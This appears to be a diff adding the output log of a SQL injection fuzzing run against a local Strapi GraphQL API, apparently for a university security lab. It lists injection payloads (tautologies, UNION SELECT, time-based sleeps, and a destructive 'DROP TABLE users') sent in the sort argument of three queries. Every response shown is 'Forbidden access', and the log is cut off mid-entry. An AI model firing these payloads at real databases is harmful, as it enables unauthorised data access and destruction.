@@ -1,0 +1,847 @@
+[+] Introspecting http://localhost:1337/graphql
+
+[>] Testing uploadFiles_connection (string args: ['sort'])
+
+[>] Testing uploadFiles (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { uploadFiles(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { uploadFiles(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { uploadFiles(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { uploadFiles(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { uploadFiles(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { uploadFiles(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { uploadFiles(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { uploadFiles(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { uploadFiles(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { uploadFiles(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { uploadFiles(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { uploadFiles(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { uploadFiles(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { uploadFiles(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { uploadFiles(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["uploadFiles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+[>] Testing i18NLocales_connection (string args: ['sort'])
+
+[>] Testing i18NLocales (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { i18NLocales(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { i18NLocales(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { i18NLocales(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { i18NLocales(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { i18NLocales(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { i18NLocales(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { i18NLocales(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { i18NLocales(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { i18NLocales(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { i18NLocales(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { i18NLocales(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { i18NLocales(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { i18NLocales(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { i18NLocales(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { i18NLocales(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["i18NLocales"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+[>] Testing reviewWorkflowsWorkflows_connection (string args: ['sort'])
+
+[>] Testing reviewWorkflowsWorkflows (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { reviewWorkflowsWorkflows(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { reviewWorkflowsWorkflows(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { reviewWorkflowsWorkflows(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { reviewWorkflowsWorkflows(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { reviewWorkflowsWorkflows(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { reviewWorkflowsWorkflows(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { reviewWorkflowsWorkflows(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { reviewWorkflowsWorkflows(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: admin' --
